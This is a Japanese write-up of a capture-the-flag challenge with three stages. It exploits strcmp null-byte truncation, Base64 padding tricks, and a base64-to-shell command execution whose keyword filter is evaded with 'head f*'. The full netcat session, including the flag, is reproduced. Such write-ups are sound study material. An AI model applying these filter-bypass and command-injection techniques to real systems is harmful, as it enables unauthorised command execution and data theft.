# Writeup
与えられたbinaryをstringsしてみると, stageが3つくらいあり, 最後は任意のコマンドが実行できるが"cat","flag"などはエスケープされてそうな文字列があることがわかる.  
とりあえず問題サーバにみると以下のような出力がされる.  
```
[*] Ok, Let's Start. Input the write string on each stage!:)
[*] -- STAGE 01 ----------
[+] KEY : HÀ¾H)L)µ1À
[+] Input >
```
よくわからないKEYが出力され, 入力を求められる.  
TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5Oig=  
という文字列がプログラム中で用意されており, 以下の条件を満たす入力が必要.  

- 入力をBase64デコードしたものと用意された文字列のBase64デコードしたものをstrcmpしてTrue
- 入力文字列長と用意された文字列長が等しい
- 入力文字列と用意された文字列が異なる

strcmpしてるので, 最後にnullバイトがくるようにしてやればよい.  
以下を入力してstage1は突破.  
TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5OigA  

続いてstage2  
今度は入力を2つ求められる. 以下の条件を満たす必要がある.  

- 入力Aと入力BをBase64デコードした結果をstrcmpしてTrue
- 入力Aと入力Bの長さが異なる

先ほどの用意されていた文字列の後ろに適当に=をつけてやったら突破できた.  
入力A:TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5Oig=  
入力B:TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5Oig====  

最後は1つだけコマンドが打てる.(echo -n input | base64 -d | sh が実行される)  
cat, flagなどはエスケープされる.  
lsするとflagというファイルがあることがわかるので, 以下を入力してフラグを得る.  
base64(head f*) 

```
$ nc 110.10.212.138 19090
[*] Ok, Let's Start. Input the write string on each stage!:)
[*] -- STAGE 01 ----------
[+] KEY : HÀ¾H)L)µ1À
[+] Input >
TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5OigA
[*] USER : N0_m4n_c4l1_ag4in_Y3st3rd4y:(
[+] -- NEXT STAGE! ----------
[*] -- STAGE 02 ----------
[+] Input 1
TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5Oig=
[+] Input 2
TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5Oig====
[+] -- NEXT STAGE! ----------
[*] -- STAGE 03 ----------
[+] Ok, It's easy task to you, isn't it? :)
[+] So I will give a chance to execute one command! :)
[*] Input >
aGVhZCBmKgo=
#                                                               echo -n aGVhZCBmKgo= | base64 -d | sh
FLAG{Nav3r_L3t_y0ur_L3ft_h4nd_kn0w_wh4t_y0ur_r1ghT_h4nd5_H4ck1ng}
```
